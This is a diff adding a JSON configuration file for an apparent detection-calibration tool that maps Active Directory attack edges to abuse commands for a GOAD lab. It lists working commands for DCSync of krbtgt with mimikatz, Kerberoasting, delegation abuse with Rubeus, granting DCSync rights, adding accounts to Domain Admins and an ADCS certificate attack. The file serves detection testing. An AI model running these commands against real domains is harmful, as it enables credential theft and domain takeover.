@@ -1,0 +1,16 @@
+{
+  "_comment": "Map each corpus edge to the abuse command to run in YOUR lab. Adjust object names (GOAD users/computers/domains) and tool paths, set enabled=true for each edge you have set up, then run Invoke-NoiseHoundCalibration.ps1. Commands run via Invoke-Expression on the attacking host. Edges left disabled or absent are skipped. `noisehound-calibrate --plan` shows which detection events each edge is scored on. LAB USE ONLY.",
+
+  "DCSync":              { "enabled": false, "command": "C:\\Tools\\mimikatz.exe \"lsadump::dcsync /domain:sevenkingdoms.local /user:krbtgt\" exit" },
+  "Kerberoast":          { "enabled": false, "command": "C:\\Tools\\Rubeus.exe kerberoast /nowrap" },
+  "ASREPRoast":          { "enabled": false, "command": "C:\\Tools\\Rubeus.exe asreproast /nowrap" },
+  "ForceChangePassword": { "enabled": false, "command": "Import-Module C:\\Tools\\PowerView.ps1; Set-DomainUserPassword -Identity jon.snow -AccountPassword (ConvertTo-SecureString 'Calib!123' -AsPlainText -Force)" },
+  "AddMember":           { "enabled": false, "command": "Import-Module C:\\Tools\\PowerView.ps1; Add-DomainGroupMember -Identity 'Domain Admins' -Members calibtest" },
+  "GenericAll":          { "enabled": false, "command": "Import-Module C:\\Tools\\PowerView.ps1; Add-DomainObjectAcl -TargetIdentity 'DC=sevenkingdoms,DC=local' -PrincipalIdentity calibtest -Rights All" },
+  "GenericWrite":        { "enabled": false, "command": "Import-Module C:\\Tools\\PowerView.ps1; Set-DomainObject -Identity jon.snow -Set @{serviceprincipalname='calib/svc'}" },
+  "WriteDacl":           { "enabled": false, "command": "Import-Module C:\\Tools\\PowerView.ps1; Add-DomainObjectAcl -TargetIdentity 'DC=sevenkingdoms,DC=local' -PrincipalIdentity calibtest -Rights DCSync" },
+  "WriteOwner":          { "enabled": false, "command": "Import-Module C:\\Tools\\PowerView.ps1; Set-DomainObjectOwner -Identity jon.snow -OwnerIdentity calibtest" },
+  "AddAllowedToAct":     { "enabled": false, "command": "C:\\Tools\\StandIn.exe --computer victim-ws --sid <attacker-computer-sid>" },
+  "AllowedToDelegate":   { "enabled": false, "command": "C:\\Tools\\Rubeus.exe s4u /user:svc_acct /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/dc.sevenkingdoms.local /nowrap" },
+  "ADCSESC1":            { "enabled": false, "command": "C:\\Tools\\Certify.exe request /ca:dc.sevenkingdoms.local\\CA /template:VulnTemplate /altname:administrator" }
+}
